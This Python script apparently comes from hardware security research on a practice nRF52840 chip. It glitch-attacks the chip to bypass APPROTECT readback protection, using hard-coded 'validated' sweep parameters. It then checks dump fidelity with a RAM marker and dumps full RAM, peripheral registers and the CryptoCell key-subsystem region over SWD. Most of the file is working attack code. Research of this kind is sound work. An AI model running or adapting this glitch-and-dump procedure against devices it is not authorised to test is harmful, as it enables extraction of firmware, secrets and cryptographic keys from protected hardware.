#!/usr/bin/env python3
"""
nrf_dump_test.py -- prove dump fidelity + sample the APB/AHB peripheral regions.

Flow (on the practice nRF52840, all while transiently unlocked by a glitch):
  1. power-cycle to RE-LOCK (baseline PROTECTED), then glitch-unlock (cold power-cycle).
  2. FIDELITY TEST: write a known marker (1C E1 CE BA B4) to RAM @0x20002000 over SWD,
     read it back, then dump the FULL RAM and confirm the marker bytes are present.
  3. sample-dump bounded APB (0x40000000) + AHB (0x50000000) peripheral regions.
  4. power-cycle to leave the part cleanly LOCKED.

Reading peripheral registers over the DAP can have side effects / unmapped addresses
bus-fault, so the APB/AHB dumps are BOUNDED samples, not the whole space.
"""
import sys
import time

from nrf_attack import Pico, find_port
from nrf_recovery import (dump_region, NRF52840_RAM_BASE, NRF52840_RAM_SIZE,
                          NRF52840_APB_BASE, NRF52840_APB_SIZE, NRF52840_AHB_BASE,
                          NRF52840_CRYPTOCELL_BASE, project_dir)

OUTDIR = project_dir()   # scripts/nrf52840/
MARKER_ADDR = 0x20002000
# SWD WRITE stores a 32-bit word little-endian, so to lay the bytes 1C E1 CE BA B4
# down in ascending memory order we write 0xBACEE11C then 0x000000B4.
MARKER_WORDS = [0xBACEE11C, 0x000000B4]
MARKER_BYTES = bytes.fromhex("1ce1cebab4")
UNLOCK_SWEEP = "1050 1350 3 165 265 4 18 4 200000"   # validated cold-boot blind sweep


def log(s):
    print(s, flush=True)


def power_cycle(p):
    p.cmd("ARM OFF", 0.1)
    p.cmd("TARGET POWER OFF", 0.4); time.sleep(0.5)
    p.cmd("TARGET POWER ON", 0.4); time.sleep(0.5)


def glitch_unlock(p, timeout=900):
    """Run the validated cold-boot sweep; return True once the firmware reports unlock."""
    p.send(f"TARGET GLITCH APPROTECT {UNLOCK_SWEEP}")
    t0 = time.time(); buf = b""; seen = False
    while time.time() - t0 < timeout:
        n = p.s.in_waiting
        if n:
            buf += p.s.read(n)
            if b"UNLOCKED on attempt" in buf and not seen:
                seen = True
                tail = buf.decode("utf-8", "replace").split("UNLOCKED on attempt", 1)[1].splitlines()[0]
                log("   UNLOCKED on attempt" + tail)
        else:
            if seen and not p.s.in_waiting:   # unlock printed + drained
                time.sleep(0.3)
                if not p.s.in_waiting:
                    break
            time.sleep(0.05)
    p.s.reset_input_buffer()
    return seen


def main():
    p = Pico(find_port(None))
    try:
        p.cmd("TARGET NRF52840", 0.4)
        log("--- baseline: power-cycle to re-lock ---")
        power_cycle(p)
        st = p.cmd("TARGET NRF STATUS", 0.7)
        log("   " + next((l for l in st.splitlines() if "APPROTECT" in l), st.strip()))

        log("--- glitch-unlock (cold power-cycle blind sweep) ---")
        if not glitch_unlock(p):
            log("FAIL: could not unlock within timeout"); return
        st = p.cmd("TARGET NRF STATUS", 0.7)
        log("   " + next((l for l in st.splitlines() if "APPROTECT" in l), st.strip()))

        # ---- FIDELITY TEST ----
        log(f"--- RAM fidelity test: write {MARKER_BYTES.hex()} @0x{MARKER_ADDR:08X} ---")
        for i, w in enumerate(MARKER_WORDS):
            p.cmd(f"SWD WRITE 0x{MARKER_ADDR + i*4:08X} 0x{w:08X}", 0.2)
        rb = p.cmd(f"SWD READ 0x{MARKER_ADDR:08X} 2", 0.3)
        log("   readback: " + " ".join(l.strip() for l in rb.splitlines() if ":" in l and l.strip().startswith("0x")))

        ram_out = f"{OUTDIR}/nrf_ram_marker.bin"
        log(f"--- dumping FULL RAM ({NRF52840_RAM_SIZE // 1024} KB) -> {ram_out} ---")
        rn = dump_region(p, NRF52840_RAM_BASE, NRF52840_RAM_SIZE, ram_out, log=log)
        data = open(ram_out, "rb").read()
        idx = data.find(MARKER_BYTES)
        if idx >= 0:
            log(f"   ✅ MARKER FOUND in RAM dump at offset 0x{idx:X} (addr 0x{NRF52840_RAM_BASE + idx:08X}) "
                f"— matches the write address 0x{MARKER_ADDR:08X}: dump is faithful.")
        else:
            log("   ❌ marker NOT found in RAM dump — dump fidelity problem!")

        # ---- APB / AHB sample dumps ----
        # APB: all instances 0..47 (CLOCK/POWER/APPROTECT/ECB/CCM/AAR/NVMC/QSPI/...) — 192 KB
        apb_out = f"{OUTDIR}/nrf_apb.bin"
        log(f"--- APB peripherals 0x{NRF52840_APB_BASE:08X} ({NRF52840_APB_SIZE//1024} KB) -> {apb_out} ---")
        an = dump_region(p, NRF52840_APB_BASE, NRF52840_APB_SIZE, apb_out, log=log)
        log(f"   APB: {an} bytes read")

        # AHB: GPIO (P0/P1)
        ahb_out = f"{OUTDIR}/nrf_ahb_gpio.bin"
        log(f"--- AHB GPIO 0x{NRF52840_AHB_BASE:08X} (4 KB) -> {ahb_out} ---")
        hn = dump_region(p, NRF52840_AHB_BASE, 0x1000, ahb_out, log=log)
        log(f"   AHB GPIO: {hn} bytes read")

        # CRYPTOCELL 310 security subsystem (crypto/keys) @0x5002A000 + CC_* engines @0x5002B000
        cc_out = f"{OUTDIR}/nrf_cryptocell.bin"
        log(f"--- CRYPTOCELL 0x{NRF52840_CRYPTOCELL_BASE:08X} (8 KB) -> {cc_out} ---")
        cn = dump_region(p, NRF52840_CRYPTOCELL_BASE, 0x2000, cc_out, log=log)
        log(f"   CRYPTOCELL: {cn} bytes read")

        log("\nSUMMARY:")
        log(f"  RAM marker     : {'FOUND' if idx >= 0 else 'NOT FOUND'} "
            f"({'fidelity OK' if idx >= 0 else 'FAIL'})")
        log(f"  APB            : {an} bytes -> {apb_out}")
        log(f"  AHB GPIO       : {hn} bytes -> {ahb_out}")
        log(f"  CRYPTOCELL     : {cn} bytes -> {cc_out}")
    finally:
        log("--- re-locking (power-cycle) ---")
        try:
            power_cycle(p)
        except Exception:
            pass
        p.close()


if __name__ == "__main__":
    main()
